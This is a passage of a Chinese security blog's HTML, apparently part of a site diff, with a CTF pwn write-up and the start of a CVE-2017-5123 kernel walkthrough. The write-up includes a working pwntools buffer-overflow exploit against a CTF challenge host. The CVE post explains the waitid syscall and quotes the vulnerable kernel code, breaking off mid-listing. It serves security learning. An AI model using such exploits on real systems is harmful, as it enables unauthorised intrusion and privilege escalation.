input);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在条件判断的时候，并没有对<code>input</code>为负的情况进行处理；</p>
+<h4 id="my-fgets"><a href="#my-fgets" class="headerlink" title="my_fgets"></a>my_fgets</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">my_fgets</span><span class="params">(__int64 str, <span class="keyword">int</span> input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Bh] [rbp-5h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; input-- != <span class="number">0</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(str + (<span class="keyword">int</span>)i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>main</code>函数传入的<code>input</code>参数是负数，那么<code>input-- != 0</code>的限制就失效了，于是可以一直以一个字节为单位不断输入数据到buf中；</p>
+<h4 id="win"><a href="#win" class="headerlink" title="win"></a>win</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在一个获取<code>flag</code>的函数；</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当我们输入负数的时候，可以利用整数溢出达到缓冲区溢出的作用；</p>
+<p>测的时候得到的<code>padding</code>是<code>56</code>；</p>
+<p>exp</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta"># p = process(<span class="meta-string">&#x27;./wtf&#x27;</span>)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="string">&#x27;29310&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">win_addr = <span class="number">0x4005F4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span> + p64(win_addr)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>有点简单。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">flag&#123;f44c6aff-26fe-415c-b3d1-d3baee69ba1a&#125;</span><br></pre></td></tr></table></figure>
+
+
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://www.jk404.cn/page/2/index.html">https://www.jk404.cn/page/2/index.html</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+
+
+        </div>
+      
+      
+      
+    </footer>
+  </div>
+</article>
+
+
+  <article id="post-CVE-2017-5123" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/CTF/PWN/kernel-pwn/cve/CVE-2017-5123/">CVE-2017-5123</a>
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2021-11-26T16:13:14.000Z" itemprop="datePublished">2021年11月27日</time>
+</span>
+      
+  <div class="article-category">
+    <i class="fa fa-classify"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a> > <a class="article-category-link" href="/categories/CTF/PWN/">PWN</a> > <a class="article-category-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a> > <a class="article-category-link" href="/categories/CTF/PWN/kernel-pwn/cve/">cve</a>
+  </div>
+
+      
+      
+<a href="/CTF/PWN/kernel-pwn/cve/CVE-2017-5123/#comments" class="article-comment-link">
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2017-5123-waitid-syscall"><a href="#CVE-2017-5123-waitid-syscall" class="headerlink" title="CVE-2017-5123 waitid syscall"></a>CVE-2017-5123 waitid syscall</h1><blockquote>
+<p>漏洞来自<a target="_blank" rel="noopener" href="https://salls.github.io/Linux-Kernel-CVE-2017-5123/">Chris Salls’s blog</a>；</p>
+<p>该漏洞由<code>Chris Salls</code>发现，利用该漏洞可以实现权限提升，突破<code>SEMP</code>、<code>SMAP</code>、<code>Chrome sandbox</code>的机制；</p>
+</blockquote>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel verison: 4.13</span><br></pre></td></tr></table></figure>
+
+<h2 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h2><h3 id="简单理解"><a href="#简单理解" class="headerlink" title="简单理解"></a>简单理解</h3><p>在进程进行系统调用的时候，内核需要具备对该进程内存的读写能力，因此就有了<code>copy_from_user</code>或者<code>put_user</code>等等交互函数，用于在内核和用户之间传输数据；</p>
+<p><code>put_user</code>大致的内容如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">put_user(x, <span class="keyword">void</span> __user *ptr)</span><br><span class="line">    <span class="keyword">if</span> (access_ok(VERIFY_WRITE, ptr, <span class="keyword">sizeof</span>(*ptr)))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT</span><br><span class="line">    user_access_begin()</span><br><span class="line">    *ptr = x</span><br><span class="line">    user_access_end()</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>access_ok</code>的功能适用于检测当前的指针<code>*ptr</code>是否位于用户区而非内核内存区域，如果通过了检测，就会调用<code>user_access_begin()</code>关闭<code>SMAP</code>，允许内核访问用户区域。此时内核将会对用户进程内存进行操作，完毕之后重新启用<code>SMAP</code>。这些访问用户进程内存的函数在读写时，如果访问未映射内存，会进行页面错误处理而不会导致崩溃。</p>
+<h3 id="wait-amp-waitpid-amp-waitid"><a href="#wait-amp-waitpid-amp-waitid" class="headerlink" title="wait &amp; waitpid &amp; waitid"></a>wait &amp; waitpid &amp; waitid</h3><p>子进程结束后，需要由父进程回收子进程，所以父进程肯定是不能先于子进程结束的，但是父进程怎么才能知道子进程结束了呢？当子进程结束时，子进程会给父进程发送<code>SIGCHILD</code>信号，之后父进程就会执行对子进程的操作；</p>
+<p>涉及到几个wait相关的函数；</p>
+<h4 id="wait"><a href="#wait" class="headerlink" title="wait"></a>wait</h4><h5 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">wait</span><span class="params">(<span class="keyword">int</span> *status)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>调用<code>wait()</code>会使父进程一直处于阻塞状态，直到有一个子进程结束并后返回该子进程pid，<code>wait()</code>函数将子进程退出的状态存储到其引用的参数<code>status</code>中，借助宏函数来进一步判断进程终止的具体原因。    </p>
+<p>因此大致的流程为：</p>
+<ul>
+<li><p>调用<code>wait()</code>阻塞等待子进程退出</p>
+</li>
+<li><p>回收子进程残留资源，保存在<code>status</code>中</p>
+</li>
+<li><p>获取子进程结束状态<code>status</code>，判断终止原因</p>
+</li>
+</ul>
+<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid, wpid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        sleep(<span class="number">300</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child, pid = %d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent, pid = %d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="comment">//获取子进程的状态</span></span><br><span class="line">        <span class="comment">//父进程一直在阻塞等待子进程结束</span></span><br><span class="line">        wpid = wait(&amp;status);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wpid ---- = %d\n&quot;</span>, wpid);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status)) &#123;</span><br><span class="line">            <span class="comment">//获取进程退出状态</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;exit with %d\n&quot;</span>, WEXITSTATUS(status));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class="line">            <span class="comment">//获取使进程异常终止的信号编号</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;killed by %d\n&quot;</span>, WTERMSIG(status)); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="waitpid"><a href="#waitpid" class="headerlink" title="waitpid"></a>waitpid</h4><p>从本质上讲，<code>waitpid</code>和<code>wait</code>作用相同；</p>
+<h5 id="原型-1"><a href="#原型-1" class="headerlink" title="原型"></a>原型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> *status,<span class="keyword">int</span> options)</span></span></span><br></pre></td></tr></table></figure>
+
+<h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><p>可以看到多了两个参数<code>pid</code>和<code>options</code>，提供了对进程控制更加灵活的操作；</p>
+<p>pid参数传入的应当是一个进程的pid，其有以下几个数值范围：</p>
+<ul>
+<li><code>pid &gt; 0</code>时，只等待进程ID等于pid的子进程，只要指定的子进程还没有结束，父进程就会一直等待。</li>
+<li><code>pid = -1</code>时，等待任何一个子进程退出，没有任何限制，此时<code>waitpid()</code>和<code>wait()</code>的作用一模一样。</li>
+<li><code>pid = 0</code>时，等待同一个进程组中的任何子进程，若子进程已经进入其他进程组，<code>waitpid()</code>不会对它做任何处理。</li>
+<li><code>pid &lt; -1</code>时，等待一个指定进程组中的任何子进程，这个进程组的ID等于pid的绝对值。</li>
+</ul>
+<p>options参数提供了额外控制选项，以<code>或|</code>的形式来设置开启，如<code>(WNOHANG|WUNTRACED)</code>：</p>
+<ul>
+<li><code>WNOHANG</code>，即<code>wait no hang</code>，即使没有子进程退出，也会立即返回；</li>
+<li><code>WUNTRACED</code>，涉及到进程跟踪；</li>
+</ul>
+<h5 id="返回"><a href="#返回" class="headerlink" title="返回"></a>返回</h5><p><code>waitpid()</code>的返回较<code>wait()</code>也相对更复杂；</p>
+<ol>
+<li>当正常返回的时候，waitpid返回收集到的子进程的进程ID；</li>
+<li>如果设置了选项<code>WNOHANG</code>，而调用中<code>waitpid()</code>发现没有已退出的子进程可收集，则返回<code>0</code>；</li>
+<li>如果调用中出错，则返回<code>-1</code>，这时<code>errno</code>会被设置成相应的值以指示错误所在；</li>
+</ol>
+<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid, pr;     </span><br><span class="line">    pid = fork();     </span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)      </span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;Error occured on forking.\n&quot;</span>);     </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">           <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">do</span>&#123;    </span><br><span class="line">        pr = waitpid(pid, <span class="literal">NULL</span>, WNOHANG);      </span><br><span class="line">        <span class="keyword">if</span>(pr == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;No child exited\n&quot;</span>);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;<span class="keyword">while</span>(pr == <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span>(pr == pid)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;successfully release child %d\n&quot;</span>, pr);</span><br><span class="line">    <span class="keyword">else</span>      </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;some error occured\n&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="waitid"><a href="#waitid" class="headerlink" title="waitid"></a>waitid</h4><p>与waitpid相似，但是更加灵活；</p>
+<h5 id="原型-2"><a href="#原型-2" class="headerlink" title="原型"></a>原型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">waitid</span><span class="params">( <span class="keyword">idtype_t</span> idtype, <span class="keyword">id_t</span> id, <span class="keyword">siginfo_t</span> *infop, <span class="keyword">int</span> options )</span></span>;</span><br></pre></td></tr></table></figure>
+
+<h5 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h5><p><code>id</code>类似于<code>waitpid()</code>中的<code>pid</code>参数，是根据<code>idytpe</code>而定的，其下是<code>idtype</code>的几个常量：</p>
+<ul>
+<li><p>P_PID：等待一个特定的进程，则参数<code>id</code>需要设置为要等待子进程的进程ID</p>
+</li>
+<li><p>P_PGID：等待一个特定进程组中的任一子进程，则参数<code>id</code>需要设置为要等待子进程的进程组ID</p>
+</li>
+<li><p>P_ALL：等待任一子进程，忽略了参数<code>id</code>的设置</p>
+</li>
+</ul>
+<p><code>infop</code>是指向<code>siginfo</code>结构的指针，包含了有关引起子进程状态改变的生成信号的详细信息；</p>
+<p><code>options</code>与<code>waitpid()</code>中的<code>options</code>如出一辙，配置选项，有以下的选择：</p>
+<ul>
+<li><code>WCONTINUED</code>：等待一个进程，它以前曾被暂停，此后又已继续，但其状态尚未报告</li>
+<li><code>WEXITED</code>：等待已退出的进程</li>
+<li><code>WNOHANG</code>：如无可用的子进程退出状态，立即返回而非阻塞</li>
+<li><code>WNOWAIT</code>：不破坏子进程退出状态。该子进程退出状态可由后续的wait、waitid或waitpid调用取得</li>
+<li><code>WSTOPPED</code>：等待一个进程，它已经暂停，但其状态尚未报告</li>
+</ul>
+<h3 id="siginfo"><a href="#siginfo" class="headerlink" title="siginfo"></a>siginfo</h3><p>下面是<code>siginfo</code>的数据结构，其中包含了各种信号处理相关的结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">siginfo</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> si_signo;			<span class="comment">// signal number的简写，该变量用来存储信号编号并且恒有值</span></span><br><span class="line">	<span class="keyword">int</span> si_errno;</span><br><span class="line">	<span class="keyword">int</span> si_code;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">int</span> _pad[SI_PAD_SIZE];</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* kill() */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">__kernel_pid_t</span> _pid;	<span class="comment">/* sender&#x27;s pid */</span></span><br><span class="line">			__ARCH_SI_UID_T _uid;	<span class="comment">/* sender&#x27;s uid */</span></span><br><span class="line">		&#125; _kill;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* POSIX.1b timers */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">__kernel_timer_t</span> _tid;	<span class="comment">/* timer id */</span></span><br><span class="line">			<span class="keyword">int</span> _overrun;		<span class="comment">/* overrun count */</span></span><br><span class="line">			<span class="keyword">char</span> _pad[<span class="keyword">sizeof</span>( __ARCH_SI_UID_T) - <span class="keyword">sizeof</span>(<span class="keyword">int</span>)];</span><br><span class="line">			<span class="keyword">sigval_t</span> _sigval;	<span class="comment">/* same as below */</span></span><br><span class="line">			<span class="keyword">int</span> _sys_private;       <span class="comment">/* not to be passed to user */</span></span><br><span class="line">		&#125; _timer;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* POSIX.1b signals */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">__kernel_pid_t</span> _pid;	<span class="comment">/* sender&#x27;s pid */</span></span><br><span class="line">			__ARCH_SI_UID_T _uid;	<span class="comment">/* sender&#x27;s uid */</span></span><br><span class="line">			<span class="keyword">sigval_t</span> _sigval;</span><br><span class="line">		&#125; _rt;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* SIGCHLD */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">__kernel_pid_t</span> _pid;	<span class="comment">/* which child */</span></span><br><span class="line">			__ARCH_SI_UID_T _uid;	<span class="comment">/* sender&#x27;s uid */</span></span><br><span class="line">			<span class="keyword">int</span> _status;		<span class="comment">/* exit code */</span></span><br><span class="line">			__ARCH_SI_CLOCK_T _utime;</span><br><span class="line">			__ARCH_SI_CLOCK_T _stime;</span><br><span class="line">		&#125; _sigchld;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* SIGILL, SIGFPE, SIGSEGV, SIGBUS */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">void</span> __user *_addr; <span class="comment">/* faulting insn/memory ref. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __ARCH_SI_TRAPNO</span></span><br><span class="line">			<span class="keyword">int</span> _trapno;	<span class="comment">/* TRAP # which caused the signal */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">			<span class="keyword">short</span> _addr_lsb; <span class="comment">/* LSB of the reported address */</span></span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="comment">/* used when si_code=SEGV_BNDERR */</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">					<span class="keyword">void</span> __user *_lower;</span><br><span class="line">					<span class="keyword">void</span> __user *_upper;</span><br><span class="line">				&#125; _addr_bnd;</span><br><span class="line">				<span class="comment">/* used when si_code=SEGV_PKUERR */</span></span><br><span class="line">				__u32 _pkey;</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125; _sigfault;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* SIGPOLL */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__ARCH_SI_BAND_T _band;	<span class="comment">/* POLL_IN, POLL_OUT, POLL_MSG */</span></span><br><span class="line">			<span class="keyword">int</span> _fd;</span><br><span class="line">		&#125; _sigpoll;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* SIGSYS */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">void</span> __user *_call_addr; <span class="comment">/* calling user insn */</span></span><br><span class="line">			<span class="keyword">int</span> _syscall;	<span class="comment">/* triggering system call number */</span></span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">int</span> _arch;	<span class="comment">/* AUDIT_ARCH_* of syscall */</span></span><br><span class="line">		&#125; _sigsys;</span><br><span class="line">	&#125; _sifields;</span><br><span class="line">&#125; __ARCH_SI_ATTRIBUTES <span class="keyword">siginfo_t</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="waitid-1"><a href="#waitid-1" class="headerlink" title="waitid"></a>waitid</h3><p><code>waitid</code>系统调用的漏洞代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/exit.c</span></span><br><span class="line">SYSCALL_DEFINE5(waitid, <span class="keyword">int</span>, which, <span class="keyword">pid_t</span>, upid, struct siginfo __user *,</span><br><span class="line">		infop, <span class="keyword">int</span>, options, struct rusage __user *, ru)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rusage</span> <span class="title">r</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">waitid_info</span> <span class="title">info</span> =</span> &#123;.status = <span class="number">0</span>&#125;;   <span class="comment">// </span></span><br><span class="line">	<span class="keyword">long</span> err = kernel_waitid(which, upid, &amp;info, options, ru ? &amp;r : <span class="literal">NULL</span>);  <span class="comment">// 调用waitid</span></span><br><span class="line">	<span class="keyword">int</span> signo = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (err &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		signo = SIGCHLD;     <span class="comment">// 信号处理号为SIGCHLD</span></span><br><span class="line">		err = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!err) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ru &amp;&amp; copy_to_user(ru, &amp;r, <span class="keyword">sizeof</span>(struct rusage))) <span class="comment">// </span></span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!infop)       <span class="comment">// 信号指针异常</span></span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	user_access_begin();   <span class="comment">// 关闭SAMP，允许内核访问用户进程内存空间</span></span><br><span class="line">	unsafe_put_user(signo, &amp;infop-&gt;si_signo, Efault);</span><br><span class="line">	unsafe_put_user(<span class="number">0</span>, &amp;infop-&gt;si_errno, Efault);</span><br><span class="line">	unsafe_put_user((<span class="keyword">short</span>)info.cause, &amp;infop-&gt;si_code, Efault);</span><br><span class="line">	unsafe_put_user(info.pid, &amp;infop-&gt;si_pid, Efault);</span><br><span class="line">	unsafe_put_user(info.uid, &amp;infop-&gt;si_uid, 